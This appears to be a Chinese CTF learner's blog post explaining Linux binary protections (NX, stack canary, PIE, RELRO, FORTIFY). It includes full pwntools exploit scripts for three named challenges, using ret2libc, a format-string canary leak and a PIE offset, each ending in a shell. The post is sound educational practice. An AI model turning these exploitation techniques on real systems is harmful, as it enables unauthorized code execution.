<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Linux保护机制 | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>Linux保护机制</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-07-24T22:38:13.000Z" id="date"> 2023-07-24</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-07-24T14:44:10.474Z" id="updated"> 2023-07-24</time></div></span></div></div><hr><div id="post-content"><p>#Linux保护机制<br><br />盛必击而破之（bushi）<br /><strong>NX</strong><br />数据不可执行。原理是将数据所在内存页标识为不可执行，防止因为程序运行出现溢出而使得攻击者的shellcode可能会在数据区尝试执行的情况。NX在咱屡战屡败的经典栈溢出实验中有接触过，NX是对栈和堆的一种保护机制。实验需要关闭NX和地址随机化，否则执行shellcode时，CPU就会抛出异常，而不是去执行恶意指令。<br />Linux系统叫做NX，Windows系统中类似的机制叫DEP(Data Execute Prevention)。<br />绕过方式：ret2libc <br />例题：[BJDCTF 2020]babyrop<br />本题没给libc，如果给了libc可以采用elf&#x3D;ELF[‘libc.so’]直接读地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import*<br>import sgtlibc<br>elf=ELF(&#x27;/home/str1k3/桌面/babyrop&#x27;)<br>#elf=ELF(&#x27;./libc.so&#x27;)<br>p = remote(&#x27;1.14.71.254&#x27;,28013)<br>pop_rdi_addr = 0x400733<br>ret_addr = 0x4004c9<br>main_addr = 0x4006AD<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)<br>p.sendlineafter(&#x27;story!\n&#x27;,payload)<br><br>puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\00&#x27;))<br>log.info(&quot;puts addr is :%x&quot;%puts_addr)<br>s = sgtlibc.Searcher()<br>s.add_condition(&#x27;puts&#x27;,puts_addr)<br>s.dump(db_index=6) # search libc , if returns multi-result ,default use index-0&#x27;s result<br><br>system_addr = s.get_address(sgtlibc.s_system)<br>binsh_addr = s.get_address(sgtlibc.s_binsh)<br>puts_addr_ = s.get_address(sgtlibc.s_puts)<br><br>print(hex(system_addr), hex(binsh_addr), hex(puts_addr_))<br>libc_base = puts_addr - puts_addr_<br>system = libc_base + system_addr<br>bin_sh = libc_base + binsh_addr<br><br>payload = b&#x27;a&#x27;*0x20+b&#x27;b&#x27;*8 + p64(ret_addr) +p64(pop_rdi_addr)+p64(bin_sh)+p64(system)<br>p.sendlineafter(&#x27;story!\n&#x27;,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>


<p>也可以用LibcSearcher，找出来的libc版本不一定对，多试几次<br />贴个LibcSearcher的板子</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>from LibcSearcher import *<br>context(log_level=&#x27;debug&#x27;,arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;) <br>io = process(&#x27;./ezrop64&#x27;)<br>#io = remote(&#x27;node3.anna.nssctf.cn&#x27;,28173)<br>elf=ELF(&#x27;./ezrop64&#x27;)<br>padding = 0x100+0x08<br><br>pop_rdi_ret = 0x4012a3<br>ret_addr =0x40101a<br>def rl(a):<br>    io.recvuntil(a)<br>rl(b&#x27;0x&#x27;)<br>puts_addr = int(io.recv(12), 16)<br>print(hex(puts_addr))<br><br>libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)<br>libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)<br>system_addr = libc_base + libc.dump(&#x27;system&#x27;)<br>bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)<br>print(&#x27;puts_addr:&#x27;,hex(puts_addr))<br>print(&#x27;libc_base:&#x27;,hex(libc_base))<br>print(&#x27;system_addr:&#x27;,hex(system_addr))<br>print(&#x27;bin_addr:&#x27;,hex(bin_addr))<br>#gdb.attach(io)<br>payload2 = b&#x27;a&#x27;* padding + p64(ret_addr)+ p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)<br>delimiter = &#x27;Hello,do you want to play a game with me???&#x27;<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure>


<p><strong>Stack Canary</strong><br />栈保护。栈溢出保护是一种缓冲区溢出攻击缓解手段。启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。<br />简单来说就是通过验证cookie，来判断执行的代码是不是恶意代码。<br />cannary通常可分为3类：<br />1.Terminator canaries:由于字符串操作不当可造成栈溢出，而字符串可以被Null(“\x00”)所截断，于是Terminator canaries将低位设置为”\x00“,可以防止被泄露，也可以防止被伪造。截断字符还可包括CR(0x0d)、LF（0x0a）、EOF(0xff)。<br />2.Randon canaries:为防止canary被攻击者猜到，Randon canaries通常在程序初始化时生成，并保存在相对安全的地方。随机数通常由&#x2F;dev&#x2F;urandom生成，有时也会使用当前时间的哈希。<br />3.Randon XOR canaries:与Randon canaries类似，但多了一个XOR操作，这样无论是canary被篡改还是与之XOR的控制数据被篡改，都会发生错误。<br />**例：[BJDCTF 2020]babyrop2 **<br />查查保护<br / class='item-img' data-src='https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203461935-a4731cbe-618d-4717-9efa-9441f622636e.png#averageHue=%23300a24&id=ibygw&originHeight=194&originWidth=791&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203461935-a4731cbe-618d-4717-9efa-9441f622636e.png#averageHue=%23300a24&id=ibygw&originHeight=194&originWidth=791&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />gift给了格式化字符串漏洞，可以泄露canary<br / class='item-img' data-src='https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203462218-2ded9fc5-d912-45e1-94d9-09bd09ca7d5c.png#averageHue=%2334322f&id=M9Jim&originHeight=488&originWidth=699&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203462218-2ded9fc5-d912-45e1-94d9-09bd09ca7d5c.png#averageHue=%2334322f&id=M9Jim&originHeight=488&originWidth=699&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />尝试泄露canary<br / class='item-img' data-src='https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203462588-441b1220-ed0f-423a-babf-076035983602.png#averageHue=%23300a25&id=lUMds&originHeight=105&originWidth=1202&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203462588-441b1220-ed0f-423a-babf-076035983602.png#averageHue=%23300a25&id=lUMds&originHeight=105&originWidth=1202&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />canary的值位于rbp-0x08处，即rbp-0x08 &#x3D; 0x20 - 0x08 &#x3D; 0x18<br / class='item-img' data-src='https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203462867-03fd097d-b37d-4384-9aea-b69da1dae4c0.png#averageHue=%23300a24&id=yHYFs&originHeight=287&originWidth=1337&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203462867-03fd097d-b37d-4384-9aea-b69da1dae4c0.png#averageHue=%23300a24&id=yHYFs&originHeight=287&originWidth=1337&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />在这里溢出<br / class='item-img' data-src='https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203463097-e5ffe986-1c88-4c5e-93ef-2b54224d526e.png#averageHue=%2333322f&id=w5AtT&originHeight=404&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203463097-e5ffe986-1c88-4c5e-93ef-2b54224d526e.png#averageHue=%2333322f&id=w5AtT&originHeight=404&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>from LibcSearcher import *<br><br>io = remote(&quot;node4.anna.nssctf.cn&quot;,28668)<br>elf = ELF(&quot;./bjdctf_2020_babyrop2&quot;)<br><br>main_addr = elf.symbols[&#x27;main&#x27;]<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>puts_got = elf.got[&#x27;puts&#x27;]<br>vuln_addr = 0x400887<br>#ROPgadget<br>rdi = 0x0000000000400993 #: pop rdi ; ret<br><br>io.sendline(&#x27;%7$p&#x27;)<br>io.recvuntil(&quot;0x&quot;)<br>canary = int(io.recv(16),16)<br>#print hex(canary)<br>#泄露puts函数地址<br>payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln_addr)<br>io.sendlineafter(&quot;story!\n&quot;,payload)<br>puts_addr = u64(io.recv(6).ljust(8,&quot;\x00&quot;))<br>#ret2libc<br>libc = LibcSearcher(&quot;puts&quot;,puts_addr)<br>libc_base = puts_addr - libc.dump(&quot;puts&quot;)<br>sys_addr = libc_base + libc.dump(&quot;system&quot;)<br>bin_sh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)<br><br>payload = (0x20-0x08)*&#x27;a&#x27;+p64(canary)+&#x27;a&#x27;*8+p64(rdi)+p64(bin_sh_addr)+p64(sys_addr)<br>io.sendlineafter(&quot;story!\n&quot;,payload)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>


<p><strong>PIE &#x2F; ASLR</strong> <br />地址随机化。就是保证同一个程序任意两次运行时的堆栈基址是不同的。如果堆栈基址不变会怎样？不变就可能被攻击，因为攻击者能确认程序的内存地址，然后通过覆盖返回地址在等手段执行恶意代码。咱屡战屡败的经典栈溢出实验就是通过覆盖返回地址执行恶意代码。<br / class='item-img' data-src='https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203463371-60544b63-ad21-4969-996c-41b279410392.png#averageHue=%23fbfbfb&id=Say7e&originHeight=720&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203463371-60544b63-ad21-4969-996c-41b279410392.png#averageHue=%23fbfbfb&id=Say7e&originHeight=720&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br /><strong>点击图片可查看完整电子表格</strong><br />pie的特点：pie保护下，地址后三位不变，相对地址不变，可以利用该特点来绕过pie。<br /><strong>例：[NISACTF 2022]ezpie</strong><br / class='item-img' data-src='https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203463575-9ba881b5-5542-4b56-b121-db4b7241091b.png#averageHue=%2333302f&id=D7kPT&originHeight=165&originWidth=540&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title='><img src="https://cdn.nlark.com/yuque/0/2023/png/34530949/1690203463575-9ba881b5-5542-4b56-b121-db4b7241091b.png#averageHue=%2333302f&id=D7kPT&originHeight=165&originWidth=540&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br />存在溢出<br />得到相对地址，即shell_addr &#x3D; main_addr + 0x80F - 0x770<br />exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>context.log_level = &#x27;debug&#x27;<br><br># p = process(&quot;./ezpie&quot;)<br>io = remote(&#x27;1.14.71.254&#x27;, 28335)<br><br><br>io.recvuntil(&#x27;0x&#x27;)<br>main_addr = int(p.recv(8), 16)<br>print(&#x27;[+]main_addr: &#x27;, hex(main_addr))<br>shell_addr = main_addr + 0x80F - 0x770<br>print(&#x27;[+]shell_addr: &#x27;, hex(shell_addr))<br>payload = b&#x27;a&#x27;*(0x28 + 4) + p32(shell_addr)<br><br><br>io.recvuntil(&quot;Input:\n&quot;)<br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<p><strong>Relro</strong><br />只读重定位。设置符号重定向表格为只读或在程序启动时就解析并绑定所有动态符号，从而减少对GOT攻击。在Linux中有”Partial RELRO” “Full RELRO”两种模式，默认开启Partical RELRO，开启Partical RELRO时，GOT是可写的，开启 FULL RELRO 时，GOT表是只读的。<br /> 主要用来保护重定位表段对应数据区域，默认可写 <br />Partial RELRO： got表不可写，got.plt可写 <br />Full RELRO： got表，got.plt不可写  <br />部分RELRO 易受到攻击，例如攻击者可以修改atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\x00获得shell<br />完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。<br />参考：<a target="_blank" rel="noopener" href="https://www.zhihu.com/question/21249496">https://www.zhihu.com/question/21249496</a><br /><strong>FORTIFY</strong><br />在编译的时候检查源码是否存在缓冲区溢出等错误。<br />简单地说，加了这个保护之后,一些敏感函数如read, fgets,memcpy, printf等等可能导致漏洞出现的函数都会被替换成__read_chk,__fgets_chk, __memcpy_chk, __printf_chk等。<br />这些带了chk的函数会检查读取&#x2F;复制的字节长度是否超过缓冲区长度，通过检查诸如%n之类的字符串位置是否位于可能被用户修改的可写地址，避免了格式化字符串跳过某些参数（如直接%7$x）等方式来避免漏洞出现。<br />##BRATH<br />程序运行时的环境变量，运行时所需要的共享库文件优先从该目录寻找，可以fake lib造成攻击。<br />源码分享，来自《CTF竞赛权威指南——pwn篇》<br />链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1r2v-73lAK-PlUQpAnPV4iw">https://pan.baidu.com/s/1r2v-73lAK-PlUQpAnPV4iw</a> <br />提取码：1145 </p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/1970/01/01/hello-world/">Hello World 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">str1k3</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>